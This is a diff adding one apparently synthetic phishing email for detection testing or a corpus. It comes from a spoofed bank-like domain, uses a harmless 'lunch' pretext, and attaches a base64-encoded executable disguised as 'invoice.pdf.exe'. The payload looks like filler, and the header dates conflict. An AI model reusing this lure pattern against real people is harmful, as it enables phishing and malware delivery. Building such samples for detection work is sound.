@@ -1,0 +1,48 @@
+From: notice@wells-fargo-alert.top
+To: victim46@example.com
+Subject: Lunch on Friday? [ref AF8634A]
+Date: Tue, 06 Mar 2002 01:59:00 -0500
+Message-ID: <phish-106-5f93c251-1ea7-44e1-9002-a6b73f0eb374@wells-fargo-alert.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 13 Mar 2002 16:49:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 28 Mar 2002 05:42:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 04 Mar 2002 06:35:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 06 Mar 2002 06:47:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 25 Mar 2002 05:54:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 20 Mar 2002 00:20:00 -0500
+Return-Path: <notice@wells-fargo-alert.top>
+Reply-To: notice@wells-fargo-alert.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=wells-fargo-alert.top; dkim=pass header.d=wells-fargo-alert.top; dmarc=pass header.from=wells-fargo-alert.top
+Received-SPF: pass (mx.example.com: domain of notice@wells-fargo-alert.top designates 192.0.2.46 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=wells-fargo-alert.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-106-8fc8801e"
+
+--bnd-p-106-8fc8801e
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AF8634A
+
+Thanks,
+Colleague
+--bnd-p-106-8fc8801e
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQAO26OGnPibjVFx1QRvmkvOv/bFuXdGdBtTktkykr2tySPHvghm/PTlJXC4ae7SYpy+PGPQl5
+nTZJmvf2zPW1+uj9VsFZEYwEh9eU9nUU3zqB8gGx4meagYhYE9rqGnoKi4ZvYGI+R1AqUv83Sn0q
+TyRdUGUQ+FLaBlYuIkIxDvCRfPI5pl3r55JPixnrTTrUVn2D43TWehBy4b1lbFzv5nNbqIneHH13
+uDzl3YR4gaYfGEP2+Z4OZPul70cnnkMUk5x+eBUgGsKNXjPbxscJ+7uPhahqVGCIMaltjfy/Cejo
+D4EBTWm2mxQCMSSqwiROzH21SYDWL7b823lfxVPzsF/W1z6g5yZH1HfnhVrrDcWANQ8Msr4/eCKd
+2DyPUWn0YI4gdFrX6LgKVm+FqdfjoB2vtrI/SvN/1OEbH1PGJRUJHth+lk04LTWRWdW0oZUjh173
+yfa1dyjJSrBVFygBpI6wJP/PfN+2accYrB4uKIQfaUv5OojiHWvbV4DjtGAFTVOf6fc3UhXoZwyW
+YdPqWKPXguPIbOWWi6hhVBdyxMkKx5HWiSiTf5kYozXF0AMGcBysE6/nfrsnFUd6nk4CU9vwH7MQ
+RFDCue0FcXAi87CvkDeBFKYvr7UfGS98wqE0PnL4Nbv30Elo3d6ZFDZuLftVuyEiqTeuiic+Cjip
+2dDh+uamWoMjgn0Ju/q65x915hwCCMj9Vta60Qp6rJm6vI+p5oJqJhIlIEt6YCdm1BT0W8Gjp2CS
+Ehhfq3SiZfdq0jApY5NnWNzDik8KZmyII35riXbFZoOctCLry+Ex2IXBD46/KSmhzNNa4pXjT9o5
+CQxr+XaUoKxzakDFAw==
+
+--bnd-p-106-8fc8801e--
